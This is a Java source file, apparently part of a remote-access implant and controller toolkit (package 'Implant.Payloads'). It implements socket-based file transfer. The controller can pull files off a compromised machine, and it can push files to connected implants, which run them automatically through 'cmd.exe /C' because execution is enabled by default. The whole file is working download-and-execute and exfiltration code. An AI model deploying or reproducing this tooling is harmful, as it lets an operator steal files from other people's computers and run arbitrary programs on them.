/**
 * Instantiate the Null Constructor thread
 * Then call put_file(Identifier, base64Encoded_data) on the null constructor to get the files written to the appropriate instance
 * When finished, call close_file(Identifier) to complete the process
 * 
 * To upload a file (e.g. from implant to controller) use the GET_FILE option with constructor similar to  
 * 
 * @author solomon sonya
 */

package Implant.Payloads;
import Implant.*;

import java.io.*;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.LinkedList;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

public class File_Transfer extends Thread implements Runnable
{
	public static final String myClassName = "File_Transfer";
	
	public static volatile boolean ALLOWED_TO_EXECUTE_RECEIVED_FILE = true;
	
	public static volatile boolean I_AM_INSTANTIATED_ON_CONTROLLER_SIDE = false;
	
	public static volatile boolean OVERRIDE_SEND_ACROSS_SOCKET = false;
	
	
	public static volatile LinkedList<File_Transfer> ACCEPTABLE_FILE = new LinkedList<File_Transfer>();
	
	public static final String PUT_FILE_OVERHEAD = "PUT_FILE_OVERHEAD";
	public static final String PUT_FILE = "PUT_FILE";
	public static final String CLOSE_FILE = "CLOSE_FILE";//done transmitting
	
	protected int myAction = 0;
	public static final int GET_FILE = 0;
	public static final int MIGRATE_FILE = 1;
	
	public volatile LinkedList<PrintWriter> myList_Sockets = null;
	public volatile PrintWriter my_pwOut_socket = null;	
	String file_path = "";
	
	public volatile File myFile = null;	
	public volatile String myIdentifier = null;
	public volatile String myFilename_and_extension = null;
	public volatile String myDestination_directory = null;
	public volatile String myExpected_file_size = null;
	public volatile String execute_upon_completion = null;
	public volatile String myExecution_parameters  = null;
	public volatile FileOutputStream fosMyFile = null;
	public volatile File myDestinationDirectory = null;
	
	public File_Transfer(boolean i_am_established_on_controller_side, boolean allwed_to_execute_received_file)
	{
		try
		{
			I_AM_INSTANTIATED_ON_CONTROLLER_SIDE = i_am_established_on_controller_side;
			ALLOWED_TO_EXECUTE_RECEIVED_FILE = allwed_to_execute_received_file;
			
			this.start();
			
			
		}
		catch(Exception e)
		{
			sop("Exception caught in null constructor for " + this.myClassName);
		}
	}//null constructor
	
			
	/**
	 * This will be the n-tuple constructor to hold attributes about a file being received
	 */
	public File_Transfer(String identifier, String filename_and_extension, String destination_directory, String expected_file_size, String exe_uopn_completion, String execution_parameters, PrintWriter socketOut)
	{
		try
		{
			my_pwOut_socket = socketOut;
			
			if(identifier == null || identifier.trim().equals("") || filename_and_extension == null || filename_and_extension.trim().equals(""))
			{
				this.send_across_socket("ERROR! INVALID DATA RECEIVED FOR PUT FILE OVERHEAD. identifier-->" + identifier + " filename_and_extension-->" + filename_and_extension + ". I am unable to continue with file write");
			}
			else//proceed and add self to the list
			{
				myIdentifier = identifier;
				myFilename_and_extension = filename_and_extension;
				myDestination_directory = destination_directory;
				myExpected_file_size = expected_file_size;
				execute_upon_completion = exe_uopn_completion;
				myExecution_parameters  = execution_parameters;
				
				//store the destination directory
				if(myDestination_directory != null && !myDestination_directory.trim().equalsIgnoreCase("null") && !myDestination_directory.trim().equals(""))
				{
					try
					{
						this.myDestinationDirectory = new File(myDestination_directory.trim());
						
						if(!this.myDestinationDirectory.exists() || !this.myDestinationDirectory.isDirectory())
						{
							this.send_across_socket("ERROR! Destination is not a directory-->" + myDestinationDirectory);
							myDestinationDirectory = null;
						}
						
						//otw, we have a good destination directory ready
						
					}
					catch(Exception e)
					{
						sop("Exception handled while trying to configure destination directory for location-->" + myDestination_directory);
						this.myDestinationDirectory = null;
					}
				}
				
				
				
				//a new file is coming, create self in temp first and get ready to write
				//we'll do a temp file first. write completely into the temp file, and then transfer to destination directory if applicable at the end
				//we proceed because at least we know we can usually write into the temp directory first
				myFile = File.createTempFile("tmp_" + myFilename_and_extension + "_", ".tmp");
				fosMyFile = new FileOutputStream(myFile);
				
				sop("Ready to populate Expected file: " + myFilename_and_extension + ". First saving contents into temp file: " + myFile);
			}
			
			
			
			
		}
		catch(Exception e)
		{
			sop("Exception in Constructor - 2 " + this.myClassName);
		}
	}
	
	/**
	 * To transmit a file from controller to connected implants for execution
	 * 
	 * @param action
	 * @param fleToSend
	 * @param destination_path
	 * @param exe_upon_completion
	 * @param exe_params
	 * @param encode_base64
	 * @param sockets
	 */
	public File_Transfer(int action, File fleToSend, String destination_path, String exe_upon_completion, String exe_params, boolean encode_base64, LinkedList<PrintWriter> sockets)
	{
		try
		{
			this.myAction = action; 
			this.myFile = fleToSend;
			this.file_path = myFile.getCanonicalPath();
			this.myDestination_directory = destination_path;
			this.execute_upon_completion = exe_upon_completion; 
			this.myExecution_parameters = exe_params;					
			myList_Sockets = sockets;
			OVERRIDE_SEND_ACROSS_SOCKET = true;
						
			
			this.start();
			
		}
		catch(Exception e)
		{
			sop("Exception caught in Constructor - 3x");
		}
	}
	
	/**
	 * Constructor to handle reading a file and sending across one socket
	 * @param command
	 * @param file_path
	 */
	public File_Transfer(int action, String path, PrintWriter out)
	{
		try
		{
			myAction = action;
			my_pwOut_socket = out;
			file_path = path;
			
			this.start();
		}
		catch(Exception e)
		{
			sop("Exception caught in constructor - 1 in " + this.myClassName);
		}
	}
	
	public void run()
	{
		try
		{
			sop(this.myClassName + " thread started!");
			
			if(myAction == GET_FILE)
			{
				boolean success = get_file(file_path, null, "false", null, my_pwOut_socket, true, null);
				
				//if successful, begin to transmit the file
				if(success && myFile != null  && myFile.exists() && myFile.isFile())
				{
					transmit_file(myFile, this.myIdentifier, this.my_pwOut_socket, true, null);
				}
			}
			
			else if(myAction == MIGRATE_FILE)
			{
				sop("Starting process to migrate file over to implant(s)");
				
				boolean success = get_file(file_path, this.myDestination_directory, this.execute_upon_completion, this.myExecution_parameters + " ", null, true, myList_Sockets);
				
				//if successful, begin to transmit the file
				if(success && myFile != null  && myFile.exists() && myFile.isFile())
				{
					transmit_file(myFile, this.myIdentifier, null, true, myList_Sockets);
				}
			}
		}
		catch(Exception e)
		{
			sop("Excaption caught in run mtd in " + myClassName);
		}
	}
	
	private boolean transmit_file(File fle, String identifier, PrintWriter pw, boolean encode_in_base64, LinkedList<PrintWriter> list_sockets)
	{
		try
		{
			InputStream is = new FileInputStream(fle);			
			String base64encoded_chunk = "";
			
			//int bufferSize = 1024;
			int bufferSize = 1024;
			int total_bytes_read = 0;
			byte [] buffer = new byte[bufferSize];
			String strToTransmit = "";
			
			//required because the last read iteration on a file does not always read up to the full buffer size. 
			//therefore, we copy what ever bytes actually read from the file into this array, and now we have the correct size to transmit and encode as required
			//this prevents from having extraneous bytes appended to a file
			int bytes_actually_read = 0;
			byte [] actual_bytes_read = null;
			
			
			sop("commencing file read on " + fle + " now...");						
			
			while((bytes_actually_read = is.read(buffer, 0, bufferSize)) > 0)
			{
				total_bytes_read += bytes_actually_read;
				
				//get the actual bytes read from the buffer (because at the end of the file, we may end up with null bytes. so remove the nulls here by only keeping the true bytes read
				actual_bytes_read = new byte[bytes_actually_read];
				for(int i = 0; i < bytes_actually_read; i++)
				{
					actual_bytes_read[i] = buffer[i];
				}
				
				if(encode_in_base64)
					strToTransmit = new String(Base64.encode(actual_bytes_read));
				else					
					//strToTransmit = (new String(buffer, 0, bytes_actually_read));
					strToTransmit = (new String(actual_bytes_read));
				
				this.send_across_socket(PUT_FILE + Driver.delimeter_1 + identifier + Driver.delimeter_1 + strToTransmit);				
			}
			
			//finished transmitting			
			sop("File read complete for: " + fle);
			
			this.send_across_socket(this.CLOSE_FILE + Driver.delimeter_1 + identifier);
			
			is.close();
			
			return true;
		}
		catch(Exception e)
		{
			sop("Exception caught in transmit_file in " + this.myClassName);
		}
		
		return false;
	}
	
	public boolean get_file(String path, String destination_directory, String execute_upon_completion, String execution_parameters, PrintWriter out, boolean base64_encode_message, LinkedList<PrintWriter> list_sockets)
	{
		try
		{
			//ensure file exists
			this.myFile = new File(path);
			
			if(myFile == null || !myFile.exists() || !myFile.isFile())
			{
				send_across_socket("ERROR! File at path: " + myFile + " does not seem to be a valid file!");
				return false;
			}
									
			//otherwise, configure to send the file
			this.myIdentifier = "" + System.currentTimeMillis();
			this.myFilename_and_extension = myFile.getName();
			this.myExpected_file_size = ""+myFile.length();
			
			//send the overhead first
			this.send_across_socket(PUT_FILE_OVERHEAD 	+ Driver.delimeter_1 + this.myIdentifier + Driver.delimeter_1 + this.myFilename_and_extension  
					 											+ Driver.delimeter_1 + destination_directory
					 											+ Driver.delimeter_1 + this.myExpected_file_size + Driver.delimeter_1 + execute_upon_completion
					 											+ Driver.delimeter_1 + execution_parameters);
			
			
			//Slow the process slightly for controller to configure for the new file
			sop("Just sent overhead for to get ready to send file-->" + myFile);
			return true;
		}
		catch(Exception e)
		{
			sop("Exception caught in get_file mtd in " + myClassName);
		}
		
		return false;
	}
	
	public void sop(String out){System.out.println(out);}
	
	public void send_across_socket(String out) 
	{	
		try	
		{ 
			if(this.I_AM_INSTANTIATED_ON_CONTROLLER_SIDE && !OVERRIDE_SEND_ACROSS_SOCKET)//otherwise, we end up sending a display message to the implant to execute!
				sop(out);
			
			else //determine which socket(s) to transmit the data
			{
				if(this.my_pwOut_socket != null)
				{
					this.my_pwOut_socket.println(out); 
					this.my_pwOut_socket.flush();
				}
				
				if(this.myList_Sockets != null && this.myList_Sockets.size() > 0)
				{
					
						for(int i = 0; i < this.myList_Sockets.size(); i++)
						{
							try
							{
								myList_Sockets.get(i).println(out);
								myList_Sockets.get(i).flush();
							}
							catch(Exception e)
							{
								continue;
							}
						}											
				}
				
			}
			
		} catch(Exception e){}
		
	}
	
	
	/**
	 * This function is called by the null constructor to iterate through the list of file_transfer instances for the appropriate identifier. when found, it will be instructed to write to the file
	 * I would have made this a static function call, but i'd prefer to one day thread this class out as well
	 * @param identifier
	 * @param base64_encoded_data_chunk
	 * @return
	 */
	public boolean put_file(String identifier, String base64_encoded_data_chunk)
	{
		try
		{
			for(int i = 0; this.ACCEPTABLE_FILE != null && i < this.ACCEPTABLE_FILE.size(); i++)
			{
				try
				{
					if(ACCEPTABLE_FILE.get(i).myIdentifier.trim().equalsIgnoreCase(identifier.trim()))
					{
						//assign the instance to write out this data chunk
						ACCEPTABLE_FILE.get(i).write_to_file(base64_encoded_data_chunk);
						break;
					}
				}
				catch(Exception e)
				{
					continue;
				}
			}
			
			return true;
		}
		catch(Exception e)
		{
			sop("Exception caught in put_file mtd in " + myClassName);
		}
		
		return false;
	}
	
	private boolean write_to_file(String base_64_encoded_data_chunk)
	{
		try
		{
			fosMyFile.write(Base64.decode(base_64_encoded_data_chunk));
			fosMyFile.flush();
			
			return true;
		}
		catch(Exception e)
		{
			sop("Exception caught in write_to_file mtd in " + myClassName);
		}
		
		return false;
	}
	
	public File close_file(String identifier)
	{
		try
		{
			for(int i = 0; this.ACCEPTABLE_FILE != null && i < this.ACCEPTABLE_FILE.size(); i++)
			{
				try
				{
					if(ACCEPTABLE_FILE.get(i).myIdentifier.trim().equalsIgnoreCase(identifier.trim()))
					{
						//assign the instance to write out this data chunk
						return ACCEPTABLE_FILE.get(i).close_file_stream();						
					}
				}
				catch(Exception e)
				{
					continue;
				}
			}
			
			//return true;
		}
		catch(Exception e)
		{
			sop("Exception caught in close_file mtd in " + myClassName);
		}
		
		return null;
	}
	
	private File close_file_stream()
	{
		try
		{
			//
			//close file
			//
			this.fosMyFile.flush();
			this.fosMyFile.close();
			
			//
			//attempt to rename the file
			//
			myFile = this.rename_file(this.myFile, this.myFilename_and_extension);
			
			//
			//try to move the file to expected destination
			//
			if(this.myDestinationDirectory != null && this.myDestinationDirectory.exists() && this.myDestinationDirectory.isDirectory())
			{
				myFile = this.move_file(this.myFile, this.myDestinationDirectory);
			}
			
			//
			//notify
			//
			this.send_across_socket("File write complete. Completed file is located at " + myFile);
			
			//this.sop("execute_upon_completion-->" + execute_upon_completion);
			
			//
			//execute if necessary
			//
			if(ALLOWED_TO_EXECUTE_RECEIVED_FILE && this.execute_upon_completion != null && this.execute_upon_completion.trim().equalsIgnoreCase("true"))
			{
				String execution = "\"" + this.myFile.getCanonicalPath() + "\"";
				
				if(this.myExecution_parameters != null && !this.myExecution_parameters.trim().equalsIgnoreCase("null") && !this.myExecution_parameters.trim().equals(""))
				{
					execution = execution + " " + myExecution_parameters;			
				}
				else//execute with out arguments
				{
					
				}
				
				execution = execution.trim();
				
				this.send_across_socket("Attempting to execute command " + execution );
				
				//execute!
				Process process = Runtime.getRuntime().exec("cmd.exe /C " + execution, null, new File("."));
			}
			
			//
			//remove self from linkedlist
			//
			this.ACCEPTABLE_FILE.remove(this);
			
			return this.myFile;
			
			
		}
		catch(Exception e)
		{
			sop("Exception caught in close_file_stream() mtd in " + myClassName);
			//e.printStackTrace(this.my_pwOut_socket);
		}
		
		return null;
	}
	
	private File move_file(File existing_file, File destination_directory)
	{
		try
		{
			File new_file_path = null;
			
			if(destination_directory.getCanonicalPath().trim().endsWith(File.separator))
				new_file_path = new File(destination_directory.getCanonicalPath().trim() + existing_file.getName());
			else
				new_file_path = new File(destination_directory.getCanonicalPath().trim() + File.separator + existing_file.getName());
			
			Path source = FileSystems.getDefault().getPath(existing_file.getCanonicalPath());
			Path destination = FileSystems.getDefault().getPath(new_file_path.getCanonicalPath());
			Path moved_file = Files.move(source, destination, StandardCopyOption.REPLACE_EXISTING);
			
			return moved_file.toFile();
			
		}
		catch(Exception e)
		{
			sop("Exception caught in move_file in " + this.myClassName);
		}
		
		return existing_file;
	}
	
	private File rename_file(File existing_file, String new_fileName_with_extension)
	{
		File renamed_temp_file = null;
		
		try
		{					
			//initialize the new file name
			if(existing_file.getParent() != null && existing_file.getParent().endsWith(File.separator))
				renamed_temp_file = new File(existing_file.getParent() + new_fileName_with_extension.trim());
			else
				renamed_temp_file = new File(existing_file.getParent() + File.separator + new_fileName_with_extension.trim());
			
			//check if already exists at location, then give it a unique name similar to its intended name
			if(renamed_temp_file.exists())
			{
				//duplicate exists here alread
				
				
				this.send_across_socket("* * * NOTE: temp file name is " + existing_file + ". I wasn't able to rename it to " + renamed_temp_file + " most likely because you have a duplicate file name in the temp directory already or access violation occurred. I am attempting to give it a new name now...");
				
				if(existing_file.getParent() != null && existing_file.getParent().endsWith(File.separator))
					renamed_temp_file = new File(existing_file.getParent() + System.currentTimeMillis() + "_" + new_fileName_with_extension);
				else
					renamed_temp_file = new File(existing_file.getParent() + File.separator + System.currentTimeMillis() + "_" + new_fileName_with_extension);				
				
			}
			
			//attempt to rename the new file
			boolean success = existing_file.renameTo(renamed_temp_file);
			
			if(success)
			{
				return renamed_temp_file;
			}
			else
			{
				//failed - could have been access denied, or existing file already existed
				//notify the user, it failed most likely because a duplicate existed before
				this.send_across_socket("* NOTE: temp file name is " + existing_file + ". I wasn't able to rename it to " + renamed_temp_file + " most likely because you have a duplicate file name in the temp directory already or access violation occurred.");
				return existing_file;
			}						
		}		
		
		catch(IllegalArgumentException iae)
		{
			this.send_across_socket("* * * Error! Unable to write file --> " + iae.getLocalizedMessage());
			
		}
		catch(Exception e)
		{
			sop("Exception caught in rename_file in " + this.myClassName);
		}
		
		return existing_file;
	}
}
